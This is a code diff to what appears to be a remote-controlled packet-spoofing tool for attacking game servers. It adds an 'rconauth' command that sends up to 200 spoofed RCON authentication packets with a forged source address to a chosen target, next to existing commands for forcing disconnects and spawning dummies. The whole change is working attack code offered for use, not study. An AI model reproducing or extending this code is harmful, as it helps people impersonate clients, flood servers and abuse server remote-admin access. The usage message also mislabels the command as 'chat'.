@@ -222,6 +222,23 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				else
 					send(g_Client, "[Server]: Please use: disconnect <srcIp> <srcPort> <dstIp> <dstPort>");
 			}
+			else if (strcmp(aCmd[0], "rconauth") == 0 || strcmp(aCmd[0], "ra") == 0)
+			{
+				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
+				{
+					int num = atoi(aCmd[5]);
+					if(num > 0 && num <= 200)
+					{
+						for(int i = 0; i < num; i++)
+							pSelf->GetPacketgen()->SendRconAuth(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])));
+						send(g_Client, "[Server]: Spoofed rcon auth sent successfully!");
+					}
+					else
+						send(g_Client, "[Server]: Please give a number of tries between 0 and 200");
+				}
+				else
+					send(g_Client, "[Server]: Please use: chat <srcIp> <srcPort> <dstIp> <dstPort> <numTries>");
+			}
 			else if (strcmp(aCmd[0], "dummies") == 0 || strcmp(aCmd[0], "dum") == 0)
 			{
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
